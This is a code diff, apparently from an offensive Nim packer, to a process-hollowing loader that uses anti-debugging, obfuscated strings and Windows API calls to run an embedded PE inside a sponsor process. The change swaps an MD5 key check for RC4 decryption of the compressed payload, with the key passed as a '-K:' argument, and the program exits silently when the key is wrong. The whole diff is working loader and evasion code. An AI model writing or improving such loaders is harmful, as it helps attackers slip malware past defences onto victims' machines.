@@ -4,7 +4,7 @@ import params
 import antidebug
 # External
 import os
-import md5
+import RC4
 import winim
 import strutils
 import nimprotect
@@ -31,30 +31,28 @@ void raiseVEH() {
 proc raiseVEH(): void {.importc: protectString("raiseVEH"), nodecl.}
 
 
-proc validateKey(commandLineParams: seq[string]) = 
-    var pass = false
-    for arg in commandLineParams:
-        if keyMd5 == getMd5(arg):
-            pass = true
-            break
-    if not pass:
-        quit(1)
+proc execute(payload: string, sponsorCmd: string = getAppFilename(), isBlockDlls: bool, sleepSeconds: int = 0, isEncrypted: bool): bool =
+      
 
-
-proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), isBlockDlls: bool, sleepSeconds: int = 0): bool =
-    
-    # Check if key in command line
+    # Decode, (Decrypt) and decompress PE
     let commandLineParams = commandLineParams()
-    if keyMd5 != "":
-        when defined(hollow4) or defined(hollow5) or defined(hollow6):
-            if protectString("-M") in commandLineParams:
-                validateKey(commandLineParams)
-        else:
-            validateKey(commandLineParams)
+    var decodedPayload = decode(payload)
+    var peStr: string
+    var isKeySupplied = false
+    if isEncrypted:
+        for i in commandLineParams:
+            if i.startsWith(protectString("-K:")) and len(i) > 3:
+                isKeySupplied = true
+                var key = i.replace(protectString("-K:"), "")
+                try:
+                    peStr = uncompress(fromRC4(key, decodedPayload))
+                except SnappyError: # Wrong RC4 key
+                    quit(1)
+        if not isKeySupplied:
+            quit(1)
+    else:
+        peStr = uncompress(decodedPayload)
 
-    # Decode and decompress PE
-    var compressedPe = decode(compressedBase64PE)
-    var peStr = uncompress(compressedPe)
 
     # Check hollowsplitted args 
     when defined(hollow4) or defined(hollow5) or defined(hollow6):
@@ -96,10 +94,11 @@ proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), 
 
 proc wrap_execute() =
     discard execute(
-        compressedBase64PE = compressedBase64PE, 
+        payload = payload, 
         sponsorCmd = sponsorPath & sponsorParams,
         isBlockDlls = isBlockDlls,
-        sleepSeconds = sleepSeconds
+        sleepSeconds = sleepSeconds,
+        isEncrypted = isEncrypted
     )
     quit(0)
 
